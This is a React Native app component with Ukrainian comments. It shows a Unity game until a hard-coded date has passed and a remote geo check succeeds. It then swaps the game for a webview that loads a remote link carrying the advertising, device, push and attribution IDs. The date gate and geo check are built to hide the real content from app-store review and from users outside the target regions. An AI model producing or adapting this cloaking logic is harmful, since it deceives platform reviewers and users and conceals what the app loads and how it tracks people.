import React, {useEffect, useRef, useState} from 'react';
import {Linking} from 'react-native';

import LoadingScreen from './LoadingScreen';

import Storage from './Storage';
import EventManager from './EventsManager';

import appsFlyer from 'react-native-appsflyer';
import ReactNativeIdfaAaid from '@sparkfabrik/react-native-idfa-aaid';
import AppleAdsAttributionInstance from '@vladikstyle/react-native-apple-ads-attribution';
import {requestTrackingPermission} from 'react-native-tracking-transparency';
import {OneSignal} from 'react-native-onesignal';
import * as Device from 'react-native-device-info';
import Params from './Params';

import AppManagerStack from './AppManagerStack';
import UnityComponent from './UnityComponent';

export default function AppManager() {
  const viewLoader = <LoadingScreen />;
  const viewGame = <UnityComponent />;
  const appManagerStack = <AppManagerStack />;

  const [isLoadingScreen, setLoadingScreen] = useState(true);
  const [isGameOpen, setGameOpen] = useState(true);

  const userID = useRef(null);
  const adID = useRef(null);
  const appsID = useRef(null);
  const subsRef = useRef(null);
  const onesignalID = useRef(null);
  const deviceID = useRef(null);
  const isPushAccess = useRef(false);
  const dataLoad = useRef(null);

  // генеруємо унікальний ID користувача
  async function getUserID() {
    const val = await Storage.get('userID');
    if (val) {
      userID.current = val; // додаємо збережений userID
    } else {
      // генеруємо новий userID якщо нема збереженого
      let result = '';
      for (let i = 0; i < 7; i++) {
        result += Math.floor(Math.random() * 10);
      }
      await Storage.save('userID', result); // зберігаємо userID
      userID.current = result;
    }
  }

  // робимо запит на відстеження
  async function getAdID() {
    OneSignal.initialize(Params.keyPush);
    await requestTrackingPermission(); // робимо запит на відстеження
    ReactNativeIdfaAaid.getAdvertisingInfoAndCheckAuthorization(true).then(
      res => {
        // обробляємо клік в алерт
        adID.current = res.id ? res.id : 'error'; // отримуємо advertising id
        initAppManager();
      },
    );
  }

  // порівнюємо теперішню дату та дату закінчення відльожки
  function checkDateStart() {
    return new Date() >= new Date(Params.targetDate);
  }

  // перевірка на відкриття webview
  async function checkInitAppManagerView() {
    EventManager.sendEvent(EventManager.eventList.firstOpen);
    if ((await fetch(Params.bodyLin)).status === 200) {
      await initOnesignal();
    } else {
      loadGame();
    } // якщо це не коректне гео запускаємо гру
  }

  // ініціалізація OneSignal
  async function initOnesignal() {
    await OneSignal.Notifications.canRequestPermission().then(permision => {
      // перевіряємо чи можемо зробити запит на надсилання пушів
      if (permision) {
        OneSignal.Notifications.requestPermission(true).then(res => {
          // робимо запит та обробляємо його
          isPushAccess.current = res;
          initAppsflyer();
        });
      }
    });
    OneSignal.User.addTag(
      'timestamp_user_id',
      `${new Date().getTime()}_${userID.current}`,
    ); // додаємо тег унікального користувача
  }

  const onInstallConversionDataCanceller = appsFlyer.onInstallConversionData(
    res => {
      try {
        if (JSON.parse(res.data.is_first_launch) === true) {
          if (res.data.af_status === 'Non-organic') {
            subsRef.current = res.data.campaign;
            generateFinish();
          } else {
            getAsaAttribution();
          }
        }
      } catch (err) {
        loadGame();
      }
    },
  );

  async function getAsaAttribution() {
    try {
      const adServicesAttributionData =
        await AppleAdsAttributionInstance.getAdServicesAttributionData();
      if (
        !adServicesAttributionData ||
        typeof adServicesAttributionData.attribution !== 'boolean'
      ) {
        generateFinish();
        return;
      }
      if (adServicesAttributionData.attribution === true) {
        subsRef.current = 'asa';
      }
      generateFinish();
    } catch (error) {
      generateFinish();
    }
  }

  // генеруємо фінальну лінку яку будемо загружати в вебвʼю
  function generateFinish() {
    OneSignal.User.getOnesignalId().then(res => {
      onesignalID.current = res;
      dataLoad.current =
        Params.bodyLin +
        `?${Params.bodyLin.split('space/')[1]}=1&appsID=${
          appsID.current
        }&adID=${adID.current}&onesignalID=${onesignalID.current}&deviceID=${
          deviceID.current
        }&userID=${deviceID.current}${generateSubs()}`;
      Storage.save('link', dataLoad.current);
      openAppManagerView(true, false);
    });
  }

  function openAppManagerView(isFirst) {
    if (isFirst && isPushAccess.current) {
      EventManager.sendEvent(EventManager.eventList.push);
    }
    EventManager.sendEvent(EventManager.eventList.web);
    setGameOpen(false);
    setLoadingScreen(false);
  }

  function generateSubs() {
    if (!subsRef.current) {
      return '';
    }
    const subList = subsRef.current.split('_');
    const subParams = subList
      .map((sub, index) => `sub_id_${index + 1}=${sub}`)
      .join('&');

    return `&${subParams}`;
  }

  // ініціалізація appsflyer
  async function initAppsflyer() {
    appsFlyer.initSdk({
      devKey: Params.keyApps,
      isDebug: false,
      appId: Params.appID,
      onInstallConversionDataListener: true,
      onDeepLinkListener: true,
      timeToWaitForATTUserAuthorization: 7,
    });

    // отримання appsflyer ID
    appsFlyer.getAppsFlyerUID((_, id) => {
      appsID.current = id;
    });
  }

  // ініціалізація AppManager
  async function initAppManager() {
    if (checkDateStart()) {
      // перевіряємо дату
      await Storage.get('link').then(res => {
        if (res) {
          // перевіряємо чи не збережена лінка якщо збережена то загружаємо webview
          dataLoad.current = res;
          openAppManagerView(false, false);
        } else {
          // якщо лінки немає то перевіряємо чи коректне гео
          checkInitAppManagerView();
        }
      });
    } else {
      // якщо дата закінчення відльожки ще не пройшла, то запускаємо гру
      loadGame();
    }
  }

  // загружаємо екран з грою
  function loadGame() {
    setTimeout(() => {
      setGameOpen(true);
      setLoadingScreen(false);
    }, 2500);
  }

  useEffect(() => {
    getUserID();
    setTimeout(() => {
      EventManager.setParams(Params.bodyLin, userID.current);
      const initialize = async () => {
        try {
          deviceID.current = await Device.getUniqueId();
          await getAdID();
        } catch (error) {}
      };
      const handleNotificationClick = event => {
        try {
          if (event.notification.launchURL) {
            EventManager.sendEvent(EventManager.eventList.browser);
            Linking.openURL(event.notification.launchURL);
          } else {
            EventManager.sendEvent(EventManager.eventList.web_push);
          }
          openAppManagerView(false, true);
        } catch (error) {}
      };
      initialize();
      OneSignal.Notifications.addEventListener(
        'click',
        handleNotificationClick,
      );
      return () => {
        OneSignal.Notifications.removeEventListener(
          'click',
          handleNotificationClick,
        );
      };
    }, 400);
  }, []);

  return isLoadingScreen ? viewLoader : isGameOpen ? viewGame : appManagerStack;
}
